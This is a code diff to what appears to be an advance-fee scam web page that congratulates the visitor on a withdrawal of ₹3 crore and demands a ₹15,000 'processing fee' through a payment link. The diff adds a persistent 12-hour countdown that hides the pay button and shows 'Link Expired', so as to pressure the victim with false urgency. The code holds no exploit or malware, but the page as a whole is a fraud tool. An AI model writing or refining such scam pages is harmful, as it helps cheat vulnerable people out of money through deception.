@@ -84,6 +84,23 @@
       color: #888;
     }
 
+    .card .timer {
+      font-size: 16px;
+      font-weight: bold;
+      color: #d9534f;
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    .expired-message {
+      text-align: center;
+      color: red;
+      font-size: 18px;
+      font-weight: bold;
+      margin-top: 20px;
+      display: none;
+    }
+
     canvas {
       position: fixed;
       top: 0;
@@ -103,7 +120,9 @@
       <div class="amount">₹3,00,00,000</div>
       <p>To complete your withdrawal, you need to pay a processing fee of ₹15,000.</p>
       <p class="red">Your withdrawal will be processed only after successful payment.</p>
-      <button onclick="redirectToPayment()">Pay Now ₹15,000</button>
+      <div class="timer" id="timer"></div>
+      <button id="payBtn" onclick="redirectToPayment()">Pay Now ₹15,000</button>
+      <div class="expired-message" id="expiredMessage">Link Expired</div>
       <p class="note">Payment will be processed securely via Cashfree Payments</p>
     </div>
   </div>
@@ -112,36 +131,51 @@
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
   <script>
     const canvas = document.getElementById('confetti-canvas');
-    const myConfetti = confetti.create(canvas, {
-      resize: true,
-      useWorker: true
-    });
+    const myConfetti = confetti.create(canvas, { resize: true, useWorker: true });
 
     const duration = 3 * 1000;
     const end = Date.now() + duration;
 
     (function frame() {
-      myConfetti({
-        particleCount: 5,
-        angle: 60,
-        spread: 55,
-        origin: { x: 0 }
-      });
-      myConfetti({
-        particleCount: 5,
-        angle: 120,
-        spread: 55,
-        origin: { x: 1 }
-      });
-
-      if (Date.now() < end) {
-        requestAnimationFrame(frame);
-      }
+      myConfetti({ particleCount: 5, angle: 60, spread: 55, origin: { x: 0 } });
+      myConfetti({ particleCount: 5, angle: 120, spread: 55, origin: { x: 1 } });
+      if (Date.now() < end) requestAnimationFrame(frame);
     })();
 
     function redirectToPayment() {
       window.location.href = "https://payments.cashfree.com/links?code=z8f6c0csag80";
     }
+
+    // ====== Persistent Timer Script ======
+    const countdownElement = document.getElementById('timer');
+    const payButton = document.getElementById('payBtn');
+    const expiredMessage = document.getElementById('expiredMessage');
+
+    // Check localStorage for existing expiry
+    let expiry = localStorage.getItem('withdrawalExpiry');
+    if (!expiry) {
+      expiry = new Date().getTime() + 12 * 60 * 60 * 1000; // 12 hours from now
+      localStorage.setItem('withdrawalExpiry', expiry);
+    } else {
+      expiry = parseInt(expiry);
+    }
+
+    const countdown = setInterval(function () {
+      const now = new Date().getTime();
+      const timeLeft = expiry - now;
+
+      if (timeLeft > 0) {
+        const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+        const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+        countdownElement.innerHTML = `Link valid for: ${hours}h ${minutes}m ${seconds}s`;
+      } else {
+        clearInterval(countdown);
+        countdownElement.innerHTML = "";
+        payButton.style.display = "none";
+        expiredMessage.style.display = "block";
+      }
+    }, 1000);
   </script>
 </body>
 </html>
